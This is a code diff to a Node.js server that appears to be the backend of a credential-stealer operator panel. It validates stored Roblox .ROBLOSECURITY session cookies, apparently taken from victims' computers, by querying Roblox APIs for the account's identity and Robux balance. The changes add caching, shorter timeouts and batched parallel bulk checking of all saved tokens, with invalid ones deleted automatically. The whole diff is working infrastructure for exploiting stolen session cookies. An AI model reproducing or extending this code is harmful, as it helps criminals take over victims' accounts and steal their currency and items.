@@ -735,17 +735,32 @@ function robloxGet(url, robloSecurity) {
       });
     });
     req.on('error', reject);
-    req.setTimeout(15000, () => { req.destroy(); reject(new Error('timeout')); });
+    req.setTimeout(4000, () => { req.destroy(); reject(new Error('timeout')); });
     req.end();
   });
 }
 
+const robuxInfoCache = new Map();
+const CACHE_TTL_MS = 45000;
+
 async function fetchRobuxInfo(robloSecurity) {
+  if (!robloSecurity || typeof robloSecurity !== 'string') return { valid: false, error: 'No token' };
+  const cleanToken = cleanRobloSecurity(robloSecurity);
+  const now = Date.now();
+  if (robuxInfoCache.has(cleanToken)) {
+    const cached = robuxInfoCache.get(cleanToken);
+    if (now - cached.timestamp < CACHE_TTL_MS) {
+      return cached.data;
+    }
+  }
+
   try {
-    const token = robloSecurity.startsWith('_|') ? robloSecurity : `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloSecurity}`;
+    const token = cleanToken.startsWith('_|') ? cleanToken : `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${cleanToken}`;
     const authInfo = await robloxGet('https://users.roblox.com/v1/users/authenticated', token);
     if (!authInfo || authInfo.errors) {
-      return { valid: false, error: 'Недействительный токен', raw: authInfo };
+      const invalidRes = { valid: false, error: 'Недействительный токен', raw: authInfo };
+      robuxInfoCache.set(cleanToken, { timestamp: now, data: invalidRes });
+      return invalidRes;
     }
     const userId = authInfo.id;
     const username = authInfo.name;
@@ -753,11 +768,11 @@ async function fetchRobuxInfo(robloSecurity) {
 
     const balanceData = await robloxGet(
       `https://economy.roblox.com/v1/users/${userId}/currency`,
-      robloSecurity
+      cleanToken
     );
     const robux = balanceData?.robux ?? null;
 
-    return {
+    const result = {
       valid: true,
       userId,
       username,
@@ -766,6 +781,8 @@ async function fetchRobuxInfo(robloSecurity) {
       created: authInfo.created,
       description: authInfo.description || ''
     };
+    robuxInfoCache.set(cleanToken, { timestamp: now, data: result });
+    return result;
   } catch (e) {
     return { valid: false, error: e.message };
   }
@@ -829,7 +846,7 @@ app.post('/robux-check', requireAuth, async (req, res) => {
   res.json(info);
 });
 
-// POST /robux-bulk — массовая проверка всех сохранённых токенов
+// POST /robux-bulk — быстрая параллельная проверка всех сохранённых токенов (бачинг по 10)
 app.post('/robux-bulk', requireAuth, async (req, res) => {
   const user = req.authUser || req.session.user;
   const db = await getDb();
@@ -839,20 +856,27 @@ app.post('/robux-bulk', requireAuth, async (req, res) => {
   } else {
     docs = (global.memFiles || []).filter(f => f.operator === user && f.roblox && f.roblox.security);
   }
+
+  const BATCH_SIZE = 10;
   const results = [];
-  for (const doc of docs) {
-    const roblox = doc.roblox || {};
-    try {
-      const info = await fetchRobuxInfo(roblox.security);
-      results.push({ file: doc.name, originalName: doc.originalName, computer: doc.computer?.name || 'Unknown', user: roblox.user, security: roblox.security, uploadedAt: doc.uploadedAt, lastLogin: roblox.lastLogin, ...info });
-      if (!info.valid) {
+
+  for (let i = 0; i < docs.length; i += BATCH_SIZE) {
+    const chunk = docs.slice(i, i + BATCH_SIZE);
+    const chunkResults = await Promise.all(chunk.map(async (doc) => {
+      const roblox = doc.roblox || {};
+      try {
+        const info = await fetchRobuxInfo(roblox.security);
+        if (!info.valid) {
+          await removeInvalidToken(db, user, doc.name);
+          console.log(`[${new Date().toLocaleTimeString()}] 🗑 Невалидный токен удалён: ${doc.name}`);
+        }
+        return { file: doc.name, originalName: doc.originalName, computer: doc.computer?.name || 'Unknown', user: roblox.user, security: roblox.security, uploadedAt: doc.uploadedAt, lastLogin: roblox.lastLogin, ...info };
+      } catch (e) {
         await removeInvalidToken(db, user, doc.name);
-        console.log(`[${new Date().toLocaleTimeString()}] 🗑 Невалидный токен удалён: ${doc.name}`);
+        return { file: doc.name, user: roblox.user, valid: false, error: e.message };
       }
-    } catch (e) {
-      results.push({ file: doc.name, user: roblox.user, valid: false, error: e.message });
-      await removeInvalidToken(db, user, doc.name);
-    }
+    }));
+    results.push(...chunkResults);
   }
   res.json(results);
 });
